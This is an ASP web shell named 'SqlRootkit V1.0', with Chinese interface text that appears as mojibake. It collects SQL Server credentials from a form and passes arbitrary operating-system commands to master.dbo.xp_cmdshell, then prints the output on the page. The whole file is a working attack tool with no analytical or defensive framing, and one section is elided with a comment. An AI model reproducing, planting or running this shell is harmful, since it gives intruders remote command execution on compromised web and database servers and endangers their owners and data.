   <%
   if request.Form("name")<>"" then
    set adoConn=Server.CreateObject("ADODB.Connection")
    adoConn.Open "Provider=SQLOLEDB.1;Password=" & request.Form("pass") & ";UID=" & request.Form("name")
    If request.form("cmd")<>"" Then
     strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'"
     set recResult = adoConn.Execute(strQuery)
     If NOT recResult.EOF Then
      Do While NOT recResult.EOF
       strResult = strResult & chr(13) & recResult(0)
       recResult.MoveNext
      Loop
     End if
     set recResult = Nothing
     strResult = Replace(strResult," ","&nbsp;")
     strResult = Replace(strResult,"<","&lt;")
     strResult = Replace(strResult,">","&gt;")
     strResult = Replace(strResult,chr(13),"<br>")
     ' and so on...
    End if
    set adoConn = Nothing
    end if
   %>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title>¡Ë SqlRootkit - by ÎÞÑÔ and edit by lake2 ¡Ë </title>
   <STYLE>
   body{ SCROLLBAR-FACE-COLOR: #719BC5; FONT-SIZE: 12px; SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ffffff; FONT-FAMILY: "ËÎÌå"; SCROLLBAR-DARKSHADOW-COLOR: #ffffff
    font-family: ËÎÌå;   font-size: 9pt}

   INPUT {BORDER: 1px none silver; }
   </STYLE>
   </head>
   <body>
   <form name="form" method=POST action="<%=Request.ServerVariables("URL")%>">
     <p>SQLÓÃ»§Ãû£º
       <input name="name" type="text" id="name" value="<%=request.Form("name")%>"  style="border: 1px solid #084B8E">
   SQLÃÜÂë£º
   <input name="pass" type="password" id="pass" value="<%=request.Form("pass")%>"  style="border: 1px solid #084B8E">
   </p>
     <p>
       <input type="text" name="cmd" size=52 style="border: 1px solid #084B8E">
       <input type="submit" value="Ö´ÐÐÃüÁî" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">
       <font size="2" color="#084B8E">&nbsp;&nbsp;</font></p>
   </form>
   <p><font color=#3F5294 style='FONT-SIZE: 9pt'>
     <%
    Response.Write request.form("cmd") & "<br><br>"
    Response.Write strResult
   %>
     </font>
       </p>
   <p><font size="2" color="#084B8E"><a target="_blank" href="http://www.96cn.com" style="text-decoration: none"><font color="#084B8E">SqlRootkit V1.0 -- by ÎÞÑÔ</font></a> and <a href="http://mrhupo.126.com" target="_blank" style="text-decoration: none">modification by lake2</a> </font>
   </p>
   </html>
